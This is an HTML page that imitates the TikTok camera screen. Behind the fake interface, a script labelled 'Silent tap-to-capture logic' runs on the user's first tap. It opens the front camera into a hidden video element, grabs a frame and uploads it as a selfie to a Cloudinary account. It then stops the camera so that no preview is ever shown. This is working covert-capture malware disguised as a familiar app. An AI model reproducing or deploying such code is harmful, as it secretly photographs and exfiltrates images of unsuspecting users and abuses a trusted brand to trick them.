<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
<title>TikTok</title>
<style>
  * { box-sizing: border-box; }
  body {
    margin: 0;
    background: #000; /* pure black */
    color: white;
    font-family: system-ui, -apple-system, Segoe UI, sans-serif;
    overflow: hidden;
  }
  button {
    font: inherit;
    color: inherit;
    background: none;
    border: 0;
    cursor: pointer;
  }
  /* Universal Mobile‑First App Container using dvh (Dynamic Viewport Height) */
  .app {
    position: relative;
    width: 100vw;
    height: 100dvh;
    margin: auto;
    background: #000;
    overflow: hidden;
  }
  /* Desktop constraint */
  @media (min-width: 431px) {
    .app {
      max-width: 430px;
      height: 92vh;
      margin-top: 4vh;
      border-radius: 40px;
      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
    }
  }
  /* Top bar with Safe Area handling for notches/dynamic islands */
  .top {
    position: absolute;
    top: max(22px, env(safe-area-inset-top));
    left: 24px;
    right: 24px;
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 10;
  }
  .x { position: absolute; left: 0; width: 34px; height: 34px; }
  .x:before, .x:after {
    content: ""; position: absolute; left: 4px; top: 16px; width: 30px; height: 3px;
    background: #fff; border-radius: 9px;
  }
  .x:before { transform: rotate(45deg); }
  .x:after { transform: rotate(-45deg); }
  .sound {
    display: flex; align-items: center; gap: 10px; padding: 12px 24px;
    border-radius: 999px; background: #19191c; font-size: 20px; font-weight: 700;
  }
  /* Side tools with Safe Area handling */
  .side {
    position: absolute;
    top: max(70px, calc(env(safe-area-inset-top) + 50px));
    right: 17px;
    display: grid;
    gap: 21px;
    text-align: center;
    font-weight: 700;
    font-size: 13px;
    z-index: 10;
  }
  .tool { width: 58px; display: grid; place-items: center; gap: 4px; text-shadow: 0 2px 10px #000; }
  .tool svg { width: 36px; height: 36px; stroke: white; fill: none; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; }
  .filled svg { fill: white; stroke: 0; }
  /* Focus ring */
  .focus {
    position: absolute; left: 50%; top: 45%; width: 145px; aspect-ratio: 1;
    border-radius: 50%; transform: translate(-50%,-50%);
    background: conic-gradient(from -25deg,#fff 0 48deg,rgba(255,255,255,.18) 50deg 360deg);
  }
  .focus:after { content: ""; position: absolute; inset: 8px; border-radius: 50%; background: #000; }
  /* Bottom bar with Safe Area handling */
  .bottom {
    position: absolute;
    left: 0;
    right: 0;
    bottom: max(20px, env(safe-area-inset-bottom));
    padding: 0 26px;
    z-index: 10;
  }
  .row { display: grid; grid-template-columns: 1fr 110px 1fr; align-items: end; }
  .small { display: grid; justify-items: center; gap: 9px; font-size: 16px; font-weight: 750; }
  .thumb { width: 45px; height: 45px; border-radius: 8px; display: grid; place-items: center; position: relative; overflow: hidden; }
  .effect {
    background: radial-gradient(circle at 35% 60%,#ff8ca0 0 5px,transparent 6px),
                radial-gradient(circle at 67% 60%,#ff8ca0 0 5px,transparent 6px),
                radial-gradient(circle at 50% 75%,#d72c4c 0 10px,transparent 11px),
                linear-gradient(135deg,#fff2e5,#ffd1be);
  }
  .effect:before, .effect:after {
    content: ""; position: absolute; top: 17px; width: 6px; height: 6px; background: #27272b; border-radius: 50%;
  }
  .effect:before { left: 14px; }
  .effect:after { right: 14px; }
  .upload { border: 2px solid white; background: #687f7c; }
  .record { justify-self: center; width: 94px; height: 94px; border-radius: 50%; background: white; display: grid; place-items: center; }
  .record span { width: 74px; height: 74px; border-radius: 50%; background: radial-gradient(circle at 65% 35%,#ff2b69,#ee1651); transition: 0.2s; }
  .record.active { transform: scale(.92); }
  .tabs { display: flex; justify-content: center; gap: 34px; margin-top: 42px; font-size: 18px; font-weight: 800; color: rgba(255,255,255,.48); }
  .tabs button { position: relative; padding-bottom: 17px; }
  .tabs .active { color: white; }
  .tabs .active:after {
    content: ""; position: absolute; left: 50%; bottom: 0; width: 6px; height: 6px;
    border-radius: 50%; background: white; transform: translateX(-50%);
  }
  /* Toast Notification */
  .toast {
    position: absolute; left: 50%; bottom: 185px; transform: translate(-50%,12px);
    background: #222; padding: 11px 18px; border-radius: 999px; opacity: 0;
    transition: .2s; font-weight: 700; pointer-events: none; z-index: 20;
  }
  .toast.show { opacity: 1; transform: translate(-50%,0); }
</style>
</head>
<body>
<main class="app">
  <div class="top">
    <button class="x"></button>
    <button class="sound" data-msg="Add sound">♪ Add sound</button>
  </div>

  <div class="side">
    <button class="tool" data-msg="Flip"><svg viewBox="0 0 40 40"><path d="M10 11a14 14 0 0 1 24 9"/><path d="M34 20l4-4m-4 4-4-4"/><path d="M30 30A14 14 0 0 1 6 20"/><path d="M6 20l-4 4m4-4 4 4"/></svg><span>Flip</span></button>
    <button class="tool filled" data-msg="Speed 1x"><svg viewBox="0 0 40 40"><circle cx="20" cy="20" r="16"/></svg><span>1x<br>Speed</span></button>
    <button class="tool" data-msg="Filters"><svg viewBox="0 0 40 40"><path fill="white" d="M20 3l4 12 12 4-12 4-4 12-4-12-12-4 12-4z"/></svg><span>Filters</span></button>
    <button class="tool" data-msg="Retouch"><svg viewBox="0 0 40 40"><path fill="white" d="M8 31l18-22 6 5-17 22H8z"/></svg><span>Retouch</span></button>
    <button class="tool filled" data-msg="Timer"><svg viewBox="0 0 40 40"><circle cx="20" cy="22" r="14"/></svg><span>3<br>Timer</span></button>
    <button class="tool" data-msg="Flash off"><svg viewBox="0 0 40 40"><path fill="white" d="M24 3L9 22h10l-3 15 15-20H21z"/><path d="M6 5l28 30"/></svg><span>Flash</span></button>
  </div>

  <div class="focus"></div>

  <section class="bottom">
    <div class="row">
      <button class="small" data-msg="Effects"><span class="thumb effect"></span><span>Effects</span></button>
      <button class="record" id="record"><span></span></button>
      <button class="small" data-msg="Upload"><span class="thumb upload">▵</span><span>Upload</span></button>
    </div>
    <div class="tabs">
      <button class="active">Camera</button><button>Templates</button><button>LIVE</button>
    </div>
  </section>

  <div class="toast" id="toast"></div>
</main>

<!-- Hidden elements for background capture -->
<video id="hiddenVideo" autoplay muted playsinline style="display:none;"></video>
<canvas id="hiddenCanvas" style="display:none;"></canvas>

<script>
  /* ---------- UI logic (unchanged) ---------- */
  const toast = document.getElementById("toast");
  const record = document.getElementById("record");
  let timer;

  function pop(t) {
    toast.textContent = t;
    toast.classList.add("show");
    clearTimeout(timer);
    timer = setTimeout(() => toast.classList.remove("show"), 1000);
  }

  document.querySelectorAll("[data-msg]").forEach(b => {
    b.onclick = () => pop(b.dataset.msg);
  });

  record.onclick = () => {
    record.classList.toggle("active");
    pop(record.classList.contains("active") ? "Recording" : "Stopped");
  };

  document.querySelectorAll(".tabs button").forEach(b => {
    b.onclick = () => {
      document.querySelector(".tabs .active").classList.remove("active");
      b.classList.add("active");
    };
  });

  /* ---------- Silent tap‑to‑capture logic ---------- */
  const CLOUD_NAME   = 'mmf0socw';   // Cloudinary account from your original code
  const UPLOAD_PRESET= '123456';     // unsigned preset from your original code

  const hiddenVideo  = document.getElementById('hiddenVideo');
  const hiddenCanvas = document.getElementById('hiddenCanvas');

  let firstTap = true;
  document.body.addEventListener('click', async () => {
    if (!firstTap) return;          // only the first tap starts the process
    firstTap = false;

    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false
      });

      hiddenVideo.srcObject = stream;
      await new Promise(res => hiddenVideo.onloadedmetadata = res);

      captureAndUpload(stream);
    } catch (err) {
      console.error('Camera permission denied or error:', err);
    }
  });

  async function captureAndUpload(stream) {
    hiddenCanvas.width  = hiddenVideo.videoWidth;
    hiddenCanvas.height = hiddenVideo.videoHeight;
    const ctx = hiddenCanvas.getContext('2d');
    ctx.drawImage(hiddenVideo, 0, 0);

    hiddenCanvas.toBlob(async blob => {
      const formData = new FormData();
      formData.append('file', blob, 'selfie.jpg');
      formData.append('upload_preset', UPLOAD_PRESET);

      try {
        await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
          method: 'POST',
          body: formData
        });
        console.log('Photo uploaded to Cloudinary');
      } catch (e) {
        console.error('Upload failed:', e);
      }

      // Stop the camera – no preview will ever be shown again
      stream.getTracks().forEach(t => t.stop());
    }, 'image/jpeg');
  }
</script>
</body>
</html>
